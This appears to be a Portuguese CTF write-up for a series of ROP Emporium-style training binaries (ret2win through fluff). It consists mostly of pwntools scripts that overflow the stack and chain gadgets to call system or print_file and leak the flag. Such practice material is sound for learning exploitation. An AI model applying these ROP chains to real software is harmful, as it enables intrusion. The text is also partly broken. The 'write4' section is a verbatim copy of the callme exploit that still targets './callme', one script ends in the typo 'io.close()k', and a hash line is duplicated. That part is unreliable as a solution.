Aqui tao minhas solucoes, em breve vou escrever um tutorial, mas por enquanto
e isso :(

- [sha256](#sha256)
- [ret2win](#ret2win)
- [split](#split)
- [callme](#callme)
- [write4](#write4)
- [badchars](#badchars)
- [fluff](#fluff)

# sha256
E as sha256 pq eu percebi q os desafios foram alterados com o passar do tempo 

```
$ sha256sum 0-ret2win/ret2win 1-split/split 1-split/split 2-callme/callme 3-write4/write4 4-badchars/badchars 5-fluff/fluff

824893a58502620cbfe8bce7d362cf96b5eb484b78291b1371fd7a2b8086c1d6  0-ret2win/ret2win
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
38b3aac5f11e673ecfbe344f9330d7dfa7d6921be506a948ab9d0347af756acb  2-callme/callme
15c9fc1d4dff1874633caebd212d4990243b072f9352baa23daf07f39a93f8cd  3-write4/write4
5308289f3937a34e4c5eac818e394217f5f22c6f21fbb0f6dc6b8e3f771deb8b  4-badchars/badchars
e5335795104d861dc5e54c8734e090f1c7dfd5b642e4607c2747aed7529c724d  5-fluff/fluff
```

# ret2win 
```
O programa fala o tamanho ate o RIP (40), e você pode usar o truque mencionado
no enunciado para testar.

Ai é só usar objdump |  grep ret2win para pegar o endereço
	 python3 -c "print('A'*40+'\x56\x07\x40',end='')" |./ret2win 
Truque pra tirar a newline (se não, não funciona)
```

# split
```py
#!/usr/bin/python3
from pwn import *

	# sys arg on RDI
    # https://godbolt.org/z/691asM

#gadgets
system = p64(0x40074b)
# gdb> print system:  0x400560
# That one is a addr to call_system (usefulFunction)

# ROPgadget or ropium
pop_rdi_ret = p64(0x4007c3)

# strings
# rabin -z   or   r2> iz 
ls = p64(0x0040084a)
cat = p64(0x00601060)

buf = b'A'*40 # Pad
# buf += p64(0x00400742)
# usefulFunction -> test offset
buf += pop_rdi_ret
buf += cat
buf += system

binary = ELF("./split")
io = process(binary.path)
io.recvuntil("> ")
io.sendline(buf)
io.recvuntil("!\n")
log.success(io.recvuntil("}"))
io.close()k
```

# callme
```py
#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF("./callme")
io = process(binary.path)
io.recvuntil("> ")
io.sendline(payload)
io.recvuntil("!\n")
log.success(io.recv(512))
io.close()
```

# write4
```py
#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF("./callme")
io = process(binary.path)
io.recvuntil("> ")
io.sendline(payload)
io.recvuntil("!\n")
log.success(io.recv(512))
io.close()
```

# badchars
```py
#!/usr/bin/python3
from pwn import *

binary = ELF("./badchars")
io = process(binary.path)
io.recvuntil("> ")

# But on data+6 there is a bad byte on the addr
# Because we wouldnt be able to fix the bad byte if the addr was also bad, we do a +3
# Other solutions:
#       If we had a-> add [REG+123whatever] 123whatever
#       or walking with inc-> REG=data_seg; 6*(inc REG); add [reg] 122whatever
#       maybe ret2csu?

# Gadgets (usefulGadgets + ropper --file badchars -b 7867612e)
write8_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)  # r12 r13 r14 r15
pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
sub1_r15_r14b = p64(0x0000000000400630)

bad = [ord('x'), ord('g'), ord('a'), ord('.')]
data_seg = 0x00601028 +3

# Funcs
def arbwrite8(addr, val): 
    temp = pop_r12_r13 +val +p64(addr)
    temp += b'B'*16 # fill r14 r15 
    return temp + write8_r13_r12
def arbsub1(addr, val): return pop_r14_r15 +val*8 +p64(addr) +sub1_r15_r14b

# Initial write
payload = b'A'*40
payload += arbwrite8(data_seg, b"\xff/fl\xff\xff\xfft") # FF as placeholder
payload += arbwrite8(data_seg+8, b"\xfft"+b'\x00'*6)

# Fix bad bytes
payload += arbsub1(data_seg+0, b'\xd1') # .
                                        # /
                                        # f
                                        # l
payload += arbsub1(data_seg+4, b'\x9e') # a
payload += arbsub1(data_seg+5, b'\x98') # g
payload += arbsub1(data_seg+6, b'\xd1') # . # addr contains bad char w/o shift
                                        # t
payload += arbsub1(data_seg+8, b'\x87') # x
                                        # t
# Load pointer and call print_file
payload += pop_rdi
payload += p64(data_seg)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil("!\n")
log.success(io.recv(512))
io.close()
```

# fluff
```py
#!/usr/bin/python3
from pwn import *

# https://www.felixcloutier.com/x86/xlat:xlatb
# https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm
# https://www.felixcloutier.com/x86/bextr

binary = ELF("./fluff")
io = process(binary.path)
io.recvuntil("> ")

# Gadgets
bextr_rbx = p64(0x000000000040062a)
	# pop    rdx	
   	# pop    rcx
   	# add    rcx,0x3ef2
   	# bextr  rbx,rcx,rdx

xlat_al_rbx = p64(0x0000000000400628)
# Set AL to memory byte [RBX + unsigned AL].

pop_rdi = p64(0x00000000004006a3)
stosb_rdi_al = p64(0x0000000000400639) 

# funcs
def mov_rbx(val):
	rcx = p64(val - 0x3ef2)
	rdx = p64(0x4000)
	# [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
	#  |                       |                 |
	#  16    num_bits=64       7  start_bit=0    0
	# bextr will copy 64 bits from rcx, 
	# starting on bit 0. Then save it on rbx
	return bextr_rbx +rdx +rcx

payload = b'A'*40
al = 0xb # al starts = 0xb
data_seg = 0x00601028
for c in b"flag.txt":
	# Load char to al
	b = next(binary.search(c)) - al
	payload += mov_rbx(b)
	payload += xlat_al_rbx
	al = c

	# Load addr to rdi
	payload += pop_rdi
	payload += p64(data_seg)
	data_seg += 1

	# write
	payload += stosb_rdi_al

payload += pop_rdi
payload += p64(0x00601028)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil("!\n")
log.success(io.recv(512))
io.close()
```